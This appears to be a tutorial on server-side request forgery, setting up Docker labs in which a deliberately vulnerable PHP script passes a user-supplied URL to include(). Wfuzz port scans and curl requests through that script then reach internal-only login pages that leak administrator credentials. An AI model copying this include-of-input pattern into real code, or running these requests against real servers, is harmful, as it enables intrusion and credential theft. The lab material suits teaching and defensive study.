Server-Side Request Forgery (SSRF) is a security vulnerability in which an attacker can force a web server to make HTTP requests on your behalf.

In an SSRF attack, the attacker uses a user input, such as a URL or form field, to send an HTTP request to a web server. The attacker manipulates the request to go to a vulnerable server or to an internal network to which the web server has access.

The SSRF attack can allow the attacker to access sensitive information such as passwords, API keys and other sensitive data, and can also go so far as to allow the attacker (depending on the scenario) to execute commands on the web server or other servers on the internal network.

One of the key differences between SSRF and CSRF is that SSRF runs on the web server instead of the user's browser. The attacker does not need to trick a legitimate user into clicking on a malicious link, as he can send the HTTP request directly to the web server from an external source.

To prevent SSRF attacks, it is important that web application developers properly validate and filter user input and limit web server access to internal network resources. In addition, web servers should be configured to limit access to sensitive resources and restrict access by unauthorized users.

# Examples

## Example 1: Two targets in the same machine

For the example we are going to install a new [[Docker]] container based on an **Ubuntu** image:

```bash
docker pull ubuntu:latest
docker run -dit --name ssrf_first_lab ubuntu
docker exec -it ssrf_first_lab bash
```

Inside of the container we will run the following commands:

```bash
apt update
apt install apache2 php nano python3 lsof -y

# Make sure that port 80 is free in order to use it with Apache
lsof -i:80
service apache2 start
```

Now we can go to the */var/www/html* folder and remove it's *index.html* file.

We will create a new *.php* file called *utility.php* whose job is to allow us to see in the url the domain that we pass it through the machine where the script is executed:

```php
<?php
    // We can use 'isset' comand for checking if 'url' parameter is specified in URL
    if(isset($_GET['url'])) {
        $url = $_GET['url'];
        echo "\n[+] Listing content of the " . $url . " website:\n\n";
        include($url);
    }
    else {
        echo "\n[!] Value for parameter URL has not been provided";
    }
?>
```

----
> Before testing the script, we need to make sure that the *allow_url_include* variable inside the */etc/php/{VERSION}apache2/php.ini* file is set to *On*, otherwise it won't allow us to visualize the specified domain.
> After that, we need to restart the **Apache** server with *service apache2 restart*.
----

We can test the script as follows:

```
http://172.17.0.2/utility.php?url=https://www.google.es
```

Now, we will create a basic login form that will be open in *production*, called **login.html**:

```html
<!DOCTYPE html> 
<html> 
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title> Login Page </title>
<style> 
Body {
  font-family: Calibri, Helvetica, sans-serif;
  background-color: pink;
}
button { 
       background-color: #4CAF50; 
       width: 100%;
        color: orange; 
        padding: 15px; 
        margin: 10px 0px; 
        border: none; 
        cursor: pointer; 
         } 
 form { 
        border: 3px solid #f1f1f1; 
    } 
 input[type=text], input[type=password] { 
        width: 100%; 
        margin: 8px 0;
        padding: 12px 20px; 
        display: inline-block; 
        border: 2px solid green; 
        box-sizing: border-box; 
    }
 button:hover { 
        opacity: 0.7; 
    } 
  .cancelbtn { 
        width: auto; 
        padding: 10px 18px;
        margin: 10px 5px;
    } 
      
   
 .container { 
        padding: 25px; 
        background-color: lightblue;
    } 
</style> 
</head>  
<body>  
    <center> <h1> Student Login Form (PRO) </h1> </center> 
    <form>
        <div class="container"> 
            <label>Username : </label> 
            <input type="text" placeholder="Enter Username" name="username" required>
            <label>Password : </label> 
            <input type="password" placeholder="Enter Password" name="password" required>
            <button type="submit">Login</button> 
            <input type="checkbox" checked="checked"> Remember me 
            <button type="button" class="cancelbtn"> Cancel</button> 
            Forgot <a href="#"> password? </a> 
        </div> 
    </form>   
</body>   
</html>
```

We will also create another practically identical one for *pre-production*, with the only difference that we will include a debug trace indicating the password. This web will be created in */tmp/login.html*:

```html
<!DOCTYPE html> 
<html> 
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title> Login Page </title>
<style> 
Body {
  font-family: Calibri, Helvetica, sans-serif;
  background-color: pink;
}
button { 
       background-color: #4CAF50; 
       width: 100%;
        color: orange; 
        padding: 15px; 
        margin: 10px 0px; 
        border: none; 
        cursor: pointer; 
         } 
 form { 
        border: 3px solid #f1f1f1; 
    } 
 input[type=text], input[type=password] { 
        width: 100%; 
        margin: 8px 0;
        padding: 12px 20px; 
        display: inline-block; 
        border: 2px solid green; 
        box-sizing: border-box; 
    }
 button:hover { 
        opacity: 0.7; 
    } 
  .cancelbtn { 
        width: auto; 
        padding: 10px 18px;
        margin: 10px 5px;
    } 
      
   
 .container { 
        padding: 25px; 
        background-color: lightblue;
    } 
</style> 
</head>  
<body>  
    <center> <h1> Student Login Form (PRE) </h1> </center> 
    <form>
        <div class="container"> 
	        <label>// * Test with administrator/adm1n$13_2023 credentials (Same as PRO)</label> <br><br>
            <label>Username : </label> 
            <input type="text" placeholder="Enter Username" name="username" required>
            <label>Password : </label> 
            <input type="password" placeholder="Enter Password" name="password" required>
            <button type="submit">Login</button> 
            <input type="checkbox" checked="checked"> Remember me 
            <button type="button" class="cancelbtn"> Cancel</button> 
            Forgot <a href="#"> password? </a> 
        </div> 
    </form>   
</body>   
</html>
```

We are going to network share the */tmp* directory with a **Python** server:

```
python3 -m http.server 4646
```

In this case, if we access the *172.17.0.2:4646/login.html* URL we can access the *PRE* web site. In this example we want that we can only access it from the same PRO machine and it is not visible in the network. For this we are going to make the resource only accessible on localhost with **Python**:

```
python3 -m http.server 4646 --bind 127.0.0.1
```

Thus, even if we call the *172.17.0.2:4646/login.html*  URL, we will not be able to view the web page outside the *PRO* machine.

In order to see this resource, we have to take into account that with the script we created previously, *utility.php*, we can search and display a domain in the browser, including the domain of our local machine:

```
http://172.17.0.2/utility.php?url=http://127.0.0.1
```

As we are inside the *PRO* machine, from here we can see the *PRE* web page specifying its port:

```
http://172.17.0.2/utility.php?url=http://127.0.0.1:4646/login.html
```

To find out the port on which the *PRE* website is located, we must apply fuzzing with **wfuzz**:

```bash
# We set a payload of type range to traverse all ports
wfuzz -c -t 200 -z range,1-65535 "http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ"
```

The disadvantage of this fuzzing is that it will show us all the responses for each port. We can see that a response that repeats a lot contains 3 lines. We can assume that the responses containing 3 lines are the same and therefore are the closed ports, so we proceed to hide them:

```bash
wfuzz -c -t 200 --hl=3 -z range,1-65535 "http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ"
```

Now we discover that the ports that are open are *80* (*PRO*) and *4646* (*PRE*).

## Example 2: Two targets in different machines but on the same internal network

Now we are going to use the same example as above but separating the *PRE* and *PRO* environments in two different machines. The attacking machine will only be in contact with the *PRO* machine and will not be able to reach the *PRE* machine. The *PRE* and *PRO* machines will be on the same subnet.

The first thing we are going to do is to create an internal network for [[Docker]] named *network1* that will be used by *PRO* and *PRE*:

```shell
docker network create --driver=bridge network1 --subnet=10.10.0.0/24
```

### PRO machine

We are going to launch the new container for the *PRO* machine and add the network we created earlier:

```bash
docker run -dit --name PRO ubuntu

# By adding this network, the machine operates in two networks
docker network connect network1 PRO
```

We access it and install a series of tools:

```bash
docker exec -it PRO bash

apt install apache2 php nano -y
```

Now we copy the *PRO* web page from the previous example with the *index.html* name and the *utility.php* tool into the */var/www/html* directory. We must also remember to access the *php.ini* and enable the *allow_url_include* value.

Then we can run **Apache**:

```bash
service apache2 start
```

### PRE machine

We are going to launch the new container for the *PRE* machine and this time we are going to add the *network1* network at the beginning, because we only want it to have that network:

```bash
docker run -dit --name PRE --network=network1 ubuntu
```

Now *PRE* and *PRO* are on the same subnet, so there is connectivity between them.

We access it and install a series of tools:

```bash
docker exec -it PRE bash

apt install nano python3 -y
```

Now we copy the *PRE* web page from the previous example with the *index.html* name into the */temp* directory.

Finally we set up a **Python** server on port *7878*:

```bash
python3 -m http.server 7878
```

### Attacker machine

We are going to launch the new container for the *Attacker Machine* machine with default network:

```bash
docker run -dit --name ATTACKER ubuntu
```

We access it and install a series of tools:

```bash
docker exec -it ATTACKER bash

apt install iputils-ping iproute2 curl -y
```

Now we can access with **curl** (or a web browser) to the **PRE** machine resource through the *utility.php* tool located on the **PRO** machine:

```bash
curl "http://172.17.0.2/utility.php?url=http://10.10.0.3:7878/"
```